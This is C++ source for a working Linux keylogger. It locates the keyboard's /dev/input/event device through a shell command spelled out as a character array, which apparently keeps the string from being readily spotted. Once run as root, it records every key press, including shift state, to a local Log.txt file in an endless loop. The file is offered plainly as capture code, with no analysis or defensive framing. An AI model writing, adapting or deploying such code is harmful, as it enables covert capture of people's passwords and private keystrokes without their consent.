#include <linux/input.h>        
#include <iostream>
#include <sys/stat.h>           
#include <unistd.h>
#include <fcntl.h>              
#include <string>
#define red "\x1b[1;31m"
#define reset "\x1b[0m"

std::string event_key(){
  char command[]={'g','r','e','p',' ',' ','"','s','y','s','r','q',' ','k','b','d','"',' ',' ','/','p','r','o','c','/','b','u','s','/','i','n','p','u','t','/','d','e','v','i','c','e','s',' ','|',' ','g','r','e','p',' ','-','o',' ','"','e','v','e','n','t','.','*','"',' ',' ','|',' ','g','r','e','p',' ','-','o',' ','"','[','0','-','9',']','.','*','"','\0'};
  FILE *fpipe;    
  char c;
  std::string str;
  if (0 == (fpipe = (FILE*)popen(command, "r"))) {
    perror("popen() failed.");
    exit(EXIT_FAILURE);
  }
  while (fread(&c, sizeof c, 1, fpipe)) {
    str.push_back(c);
  }
  pclose(fpipe);
  return str;
}

int main(int argc, char *argv[]) {
  
  if(getuid()!=0){
    std::cerr<<red<<"You dont have permission to read the event files\n"<<reset;
    return -1;
  }

  char eventfile[20]="/dev/input/event";
  std::string event_str=event_key();
  int i=0;
  int val;
  while((val=event_str[i]!=' ')) {
    eventfile[i+16]=event_str[i];
    i++;
  }

  struct input_event ev;
  FILE *fp=fopen("Log.txt","a");
  FILE *fd=fopen(eventfile,"r");

  if(!fd) {
    std::cout << red <<"Error: "<<reset<<"Could not open the event-file\nYou might not have neceessary perimisson to read the event file\n";
    return -1;
  }
  
  if(!fp) {
    std::cout << red <<"Error: "<<reset<<"Could not create/open the Log file\nCheck if you have permission to create file in current directory\nCheck if you have all necessary permission to write into 'Log.txt' file\n";
    return -1;
  }
  
  while(1) {
    fread(&ev,sizeof(ev),1,fd);
    if(ev.type == EV_KEY) {
      if((ev.code==42 || ev.code==54) && ev.value!=2) {
	fprintf(fp,"%d ",ev.code);
	fflush(fp);
      }
      else if(ev.value==1){
	fprintf(fp,"%d ",ev.code);
	fflush(fp);
      }
    }
    
  }
  return 0;
}




